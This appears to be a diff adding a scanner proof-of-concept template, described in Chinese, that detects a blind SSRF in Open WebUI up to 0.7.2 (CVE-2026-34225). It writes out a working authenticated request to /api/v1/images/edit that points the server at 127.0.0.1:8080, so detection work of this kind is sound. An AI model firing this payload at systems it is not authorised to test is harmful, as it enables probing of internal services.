@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "检测 Open WebUI ≤0.7.2 图片编辑功能中的盲 SSRF 漏洞。通过向 /api/v1/images/edit 发送包含内网地址的 POST 请求，验证服务器是否对外部提供的 URL 发起未经限制的 GET 请求，从而确认 SSRF 漏洞存在。"
+id = "POC-AVE-2026-0261"
+name = "Open WebUI Blind SSRF PoC"
+severity = "medium"
+tags = ["ave-2026-0261"]
+vuln_id = [
+    "CVE-2026-34225",
+    "AVE-2026-0261",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/v1/images/edit"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"form_data":{"image":"http://127.0.0.1:8080/","prompt":"poc"}}'
+type = "json"
+
+[poc.requests.headers]
+Authorization = "Bearer {{token}}"
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
